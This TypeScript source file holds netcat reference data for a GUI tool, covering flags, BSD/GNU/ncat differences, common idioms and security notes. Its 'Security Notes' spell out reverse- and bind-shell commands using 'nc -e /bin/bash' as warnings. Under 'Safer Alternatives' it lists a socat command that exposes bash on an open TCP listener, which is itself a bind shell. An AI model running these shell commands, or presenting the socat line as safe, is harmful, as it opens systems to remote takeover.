/**
 * nc (netcat) documentation
 * BSD / GNU / ncat variant-aware reference material.
 */

export interface ManSection {
  title: string;
  content: string;
}

export interface ManExample {
  command: string;
  description: string;
  variant?: string; // 'all' | 'bsd' | 'gnu' | 'ncat'
}

export interface ManPageData {
  name: string;
  synopsis: string;
  description: string;
  sections: ManSection[];
  examples: ManExample[];
}

export const ncManPage: ManPageData = {
  name: 'nc — arbitrary TCP and UDP connections and listens',
  synopsis: 'nc [options] [hostname] [port[s]]',
  description: `nc (netcat) is the "TCP/IP Swiss army knife." It reads and writes data across network connections using TCP or UDP.

Three major variants exist:
  • BSD nc   — macOS built-in (OpenBSD heritage). No -e exec flag.
  • GNU nc   — netcat-traditional on Linux. May have -e (dangerous!).
  • ncat     — Nmap project. Adds SSL, broker mode, Lua scripting.

netcat is famously dual-use: legitimate for debugging, testing, and scripting, but also a common attacker tool. The GUI below flags the most dangerous idioms and explains safer alternatives.`,

  sections: [
    {
      title: 'Core Flags',
      content: `-l          Listen mode (server side)
-k          Keep listening after connection closes (BSD/GNU, use --keep-open in ncat)
-u          Use UDP instead of TCP
-v          Verbose output (shows connection info on stderr)
-n          No DNS resolution (use raw IPs)
-z          Zero-I/O: scan only, do not send data (BSD; not in ncat — use nmap)
-w seconds  Idle timeout (client mode; ignored in listen mode)
-p port     Source port (cannot use with -l)
-s addr     Source IP address (cannot use with -l)
-4 / -6     Force IPv4 / IPv6`,
    },
    {
      title: 'Variant Differences (Critical)',
      content: `Flag        BSD nc      GNU nc-trad  GNU nc-openbsd  ncat
-z          YES         YES          YES             NO (use nmap)
-k          YES         NO           YES             --keep-open
-e cmd      NO          YES (!)      NO              NO (use --exec)
-c shell    NO          YES (!)      NO              NO
--ssl       NO          NO           NO              YES
--broker    NO          NO           NO              YES
-X/-x proxy YES         NO           NO              --proxy

-e and -c allow remote command execution. They are ABSENT from BSD nc
intentionally. If you need a safe exec channel, use ncat or socat.`,
    },
    {
      title: 'Common Idioms',
      content: `# Client: connect and chat
nc host 1234

# Server: listen once
nc -l 1234

# Server: keep listening (BSD / ncat)
nc -l -k 1234           # BSD
ncat --keep-open -l 1234  # ncat

# UDP
nc -u host 5353
nc -u -l 5353

# Port scan (BSD only, quiet)
nc -z -v host 20-25

# Banner grab
printf 'HEAD / HTTP/1.0\\r\\nHost: example.com\\r\\n\\r\\n' | nc -w 3 example.com 80

# File transfer (sender → receiver)
# Receiver first:  nc -l 9999 > received.tar.gz
# Sender second:   nc host 9999 < archive.tar.gz

# SMTP banner check
nc -w 3 mail.example.com 25`,
    },
    {
      title: 'Security Notes',
      content: `DANGER ZONE — READ BEFORE USING -e / -c
------------------------------------------
nc -e /bin/bash host port   # GNU only: sends a shell to remote host
nc -l -e /bin/bash -p 4444  # GNU only: binds a shell on port 4444

These commands create REVERSE SHELLS and BIND SHELLS — core penetration
testing techniques and also the #1 malware payload delivery method.

• Never run these on systems you do not own or have written permission to test.
• BSD nc deliberately omits -e for safety.
• If you need exec functionality, prefer ncat --exec with access controls,
  or socat which has more isolation options.
• Firewall and monitor ports: services listening on all interfaces (0.0.0.0)
  are reachable from everywhere.

Educational reference: https://github.com/nicowillis/netcat-cheatsheet`,
    },
    {
      title: 'Safer Alternatives',
      content: `socat — more powerful and auditable than nc
  socat TCP-LISTEN:1234,reuseaddr,fork EXEC:/bin/bash,pty,stderr

ncat (nmap) — adds SSL, access control, broker mode
  ncat --ssl --listen 1234
  ncat --allow 192.168.1.0/24 --listen 4444

ssh -L / -R — encrypted port forwarding without raw sockets
  ssh -L 8080:internal-host:80 jumphost

For file transfer, prefer scp, rsync, or sftp over plain nc.`,
    },
  ],

  examples: [
    { command: 'nc -zv example.com 80', description: 'Check if port 80 is open (BSD)', variant: 'bsd' },
    { command: 'nc -zv host 20-25', description: 'Scan ports 20–25 (BSD)', variant: 'bsd' },
    { command: 'printf "HEAD / HTTP/1.0\\r\\n\\r\\n" | nc -w 3 example.com 80', description: 'HTTP banner grab', variant: 'all' },
    { command: 'nc -l 9999 > received.bin', description: 'Receive a file on port 9999', variant: 'all' },
    { command: 'nc host 9999 < send.bin', description: 'Send a file to listener', variant: 'all' },
    { command: 'nc -l -k 1234', description: 'Keep-listening server (BSD)', variant: 'bsd' },
    { command: 'ncat --ssl --listen 4444', description: 'Encrypted listener (ncat only)', variant: 'ncat' },
    { command: 'nc -u -l 5353', description: 'UDP listener on port 5353', variant: 'all' },
    { command: 'nc -w 5 host 443', description: 'Connect with 5 s timeout', variant: 'all' },
    { command: 'nmap -sV host -p 22,80,443', description: 'Use nmap instead of nc -z for reliable scanning', variant: 'ncat' },
  ],
};

export function getNcManPage(): ManPageData {
  return ncManPage;
}
